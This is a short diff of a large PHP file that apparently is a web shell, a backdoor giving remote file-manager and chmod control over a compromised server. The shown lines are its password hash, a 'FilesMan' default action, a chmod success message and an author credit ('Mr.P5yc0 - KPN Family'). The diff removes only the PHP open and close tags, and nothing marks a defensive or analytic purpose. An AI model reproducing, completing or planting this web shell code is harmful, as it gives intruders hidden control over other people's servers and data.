@@ -1,4 +1,3 @@
-<?php
 $auth_pass = "b1daafa69de454f40fdf7a29b6efd19c";
 $color = "#00ff00";
 $default_action = 'FilesMan';
@@ -4337,5 +4336,3 @@ echo "<font color=aqua>Chmod to ".$scial." Successfully</font><br>";
 		}
 	echo "<center><font color=blue size=-20>SOURCE : </font><font color=aqua size=-20>./Mr.P5yc0</font> - <font color=lime size=-20>KPN Family</font></center>";
 }
-?>
-</html>
